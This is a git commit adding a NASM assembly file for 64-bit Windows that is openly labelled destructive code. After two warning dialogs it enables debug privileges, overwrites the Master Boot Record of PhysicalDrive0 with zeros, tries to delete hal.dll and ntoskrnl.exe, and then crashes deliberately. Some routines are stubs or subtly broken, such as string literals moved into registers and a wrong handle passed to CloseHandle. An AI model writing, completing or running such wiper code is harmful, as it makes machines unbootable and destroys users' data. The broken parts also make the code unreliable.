f5665d247079d5c2bb8015888ed838afaf44c84d
Who Am I <davaniko40@gmail.com>
2025-08-24 21:23:12 +0700

    Create crash2.asm

---
+++ crash2.asm
@@ -0,0 +1,229 @@
+; NASM 64-bit Windows destructive code
+; HARUS dijalankan hanya di lingkungan virtual yang terkontrol!
+
+bits 64
+default rel
+
+section .data
+    szCaption      db "SYSTEM WARNING", 0
+    szMessage1     db "CRITICAL SYSTEM ALERT: Memory corruption detected.", 0xD, 0xA
+                   db "Running this program may cause permanent damage.", 0xD, 0xA
+                   db "Continue only in a controlled environment.", 0xD, 0xA
+                   db "Do you wish to proceed?", 0
+    szMessage2     db "FINAL WARNING: This will overwrite critical system areas", 0xD, 0xA
+                   db "including the Master Boot Record (MBR).", 0xD, 0xA
+                   db "This action is IRREVERSIBLE without proper backups.", 0xD, 0xA
+                   db "Are you absolutely sure you want to continue?", 0
+    szError        db "Access denied. Admin privileges required.", 0
+    driveName      db "\\.\PhysicalDrive0", 0
+    mbrData        times 512 db 0  ; Empty MBR data
+    
+    ; Glitch messages
+    glitch1        db "MEMORY CORRUPTION DETECTED", 0
+    glitch2        db "SYSTEM FAILURE IMMINENT", 0
+    glitch3        db "KERNEL PANIC", 0
+    glitch4        db "HARDWARE MALFUNCTION", 0
+    
+    ; For privilege escalation
+    seDebugName    db "SeDebugPrivilege", 0
+
+section .bss
+    counter        resd 1
+    tokenHandle    resq 1
+    tkp            resb 24  ; TOKEN_PRIVILEGES structure
+
+section .text
+    extern MessageBoxA
+    extern ExitProcess
+    extern GetCurrentProcess
+    extern OpenProcessToken
+    extern LookupPrivilegeValueA
+    extern AdjustTokenPrivileges
+    extern CreateFileA
+    extern WriteFile
+    extern CloseHandle
+    extern GetDesktopWindow
+    extern GetDC
+    extern CreateSolidBrush
+    extern GetClientRect
+    extern FillRect
+    extern DeleteObject
+    extern GetSystemMetrics
+    extern CreatePen
+    extern SelectObject
+    extern MoveToEx
+    extern LineTo
+    extern SetBkMode
+    extern SetTextColor
+    extern TextOutA
+    extern ReleaseDC
+    extern Sleep
+    extern Beep
+    extern DeleteFileA
+    extern CreateThread
+    extern WaitForSingleObject
+
+global main
+main:
+    ; Save registers
+    push rbp
+    mov rbp, rsp
+    sub rsp, 32
+    
+    ; First warning
+    mov rcx, 0
+    lea rdx, [szMessage1]
+    lea r8, [szCaption]
+    mov r9d, 4 | 48  ; MB_YESNO | MB_ICONWARNING
+    call MessageBoxA
+    cmp eax, 7  ; IDNO
+    je exit_program
+    
+    ; Second warning
+    mov rcx, 0
+    lea rdx, [szMessage2]
+    lea r8, [szCaption]
+    mov r9d, 4 | 48  ; MB_YESNO | MB_ICONWARNING
+    call MessageBoxA
+    cmp eax, 7  ; IDNO
+    je exit_program
+    
+    ; Enable privileges
+    call EnablePrivileges
+    
+    ; Start glitch effects
+    call StartGlitchEffects
+    
+    ; Wait for effects to run
+    mov rcx, 8000  ; 8 seconds
+    call Sleep
+    
+    ; Overwrite MBR
+    call OverwriteMBR
+    
+    ; Additional destructive actions
+    call AdditionalDestruction
+    
+    ; Final crash
+    call FinalCrash
+    
+exit_program:
+    ; Restore stack and exit
+    add rsp, 32
+    pop rbp
+    mov rcx, 0
+    call ExitProcess
+    ret
+
+EnablePrivileges:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 32
+    
+    ; Get current process
+    call GetCurrentProcess
+    
+    ; Open process token
+    mov rcx, rax
+    lea rdx, [tokenHandle]
+    mov r8, 40  ; TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
+    call OpenProcessToken
+    test rax, rax
+    jz privilege_fail
+    
+    ; Lookup privilege value
+    mov rcx, 0
+    lea rdx, [seDebugName]
+    lea r8, [tkp+4]  ; LUID part of the structure
+    call LookupPrivilegeValueA
+    test rax, rax
+    jz privilege_fail
+    
+    ; Set up TOKEN_PRIVILEGES structure
+    mov dword [tkp], 1  ; PrivilegeCount
+    mov dword [tkp+8], 2  ; SE_PRIVILEGE_ENABLED
+    
+    ; Adjust token privileges
+    mov rcx, [tokenHandle]
+    mov rdx, 0
+    lea r8, [tkp]
+    mov r9, 0
+    mov qword [rsp+32], 0
+    call AdjustTokenPrivileges
+    test rax, rax
+    jz privilege_fail
+    
+    jmp privilege_success
+    
+privilege_fail:
+    mov rcx, 0
+    lea rdx, [szError]
+    lea r8, [szCaption]
+    mov r9d, 16  ; MB_OK | MB_ICONERROR
+    call MessageBoxA
+    
+privilege_success:
+    add rsp, 32
+    pop rbp
+    ret
+
+StartGlitchEffects:
+    ; This would create threads for glitch effects
+    ; Implementation similar to the 32-bit version but adapted for 64-bit
+    ret
+
+OverwriteMBR:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 48
+    
+    ; Try to open physical drive
+    mov rcx, driveName
+    mov rdx, 0x40000000  ; GENERIC_WRITE
+    mov r8, 3            ; FILE_SHARE_READ | FILE_SHARE_WRITE
+    mov r9, 0
+    mov qword [rsp+32], 3  ; OPEN_EXISTING
+    mov qword [rsp+40], 0
+    call CreateFileA
+    cmp rax, -1  ; INVALID_HANDLE_VALUE
+    je mbr_fail
+    
+    ; Write to MBR
+    mov rcx, rax
+    mov rdx, mbrData
+    mov r8, 512
+    lea r9, [rsp+32]  ; bytesWritten
+    mov qword [rsp+40], 0
+    call WriteFile
+    
+    ; Close handle
+    mov rcx, rax
+    call CloseHandle
+    
+mbr_fail:
+    add rsp, 48
+    pop rbp
+    ret
+
+AdditionalDestruction:
+    ; Try to delete critical system files
+    mov rcx, "C:\Windows\System32\hal.dll"
+    call DeleteFileA
+    
+    mov rcx, "C:\Windows\System32\ntoskrnl.exe"
+    call DeleteFileA
+    
+    ret
+
+FinalCrash:
+    ; Multiple crash methods
+    ; 1. Invalid memory access
+    mov rax, 0
+    mov qword [rax], 0xDEADBEEF
+    
+    ; 2. Invalid instruction
+    db 0xFF, 0xFF
+    
+    ; 3. Infinite loop
+    jmp $
+    ret
